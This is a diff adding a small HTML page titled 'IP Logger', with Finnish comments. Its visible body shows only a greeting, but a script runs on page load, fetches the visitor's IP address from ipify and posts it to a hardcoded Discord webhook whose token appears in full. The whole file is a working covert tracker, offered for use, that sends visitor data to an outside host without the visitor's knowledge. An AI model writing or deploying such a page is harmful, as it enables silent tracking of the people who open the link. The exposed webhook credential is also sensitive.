@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>IP Logger</title>
+  <script>
+    // Vaihda tämä omalla Discord-webhookillasi
+    const webhookURL = "https://discord.com/api/webhooks/1370024285388935248/0E2R22YDshvTclO1KtBTDwYQ7QJnCa-h-sf8RwRDtYXL9EJkRvNeL53WTZ3dLVatp5gU";
+
+    // Hakee käyttäjän IP:n ipify API:n kautta
+    fetch("https://api.ipify.org?format=json")
+      .then(response => response.json())
+      .then(data => {
+        const ip = data.ip;
+
+        // Luo viesti Discordia varten
+        const payload = {
+          content: "Uusi IP: " + ip
+        };
+
+        // Lähetä webhook-pyyntö
+        fetch(webhookURL, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify(payload)
+        });
+      });
+  </script>
+</head>
+<body>
+  <h1>Hei!</h1>
+</body>
+</html>
